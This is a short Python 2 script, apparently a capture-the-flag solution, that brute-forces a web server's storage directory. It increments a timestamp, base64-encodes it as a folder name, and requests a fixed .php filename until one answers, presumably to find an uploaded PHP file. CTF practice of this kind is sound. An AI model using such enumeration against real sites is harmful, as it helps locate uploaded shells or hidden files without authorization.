from requests import *
from sys import stdout
__URL__ = "http://ctf.asgama.web.id:41003/storages/"
filename = "/b7f246b1d77c289fe8143ef48201ab40.php"

limit = int("MTU0NjEwMzEyMw==".decode("base64")) # time stamp dari file image normal
flag = False

while not flag:
    stdout.flush()
    stdout.write("\r"+str(limit))
    r = get("{}{}{}".format(__URL__,str(limit).encode('base64')[:-1],filename))

    if (r.status_code == 200):
        __URL__ = "{}{}{}".format(__URL__,str(limit).encode('base64')[:-1],filename)
        print __URL__
        flag = True
    limit+=1

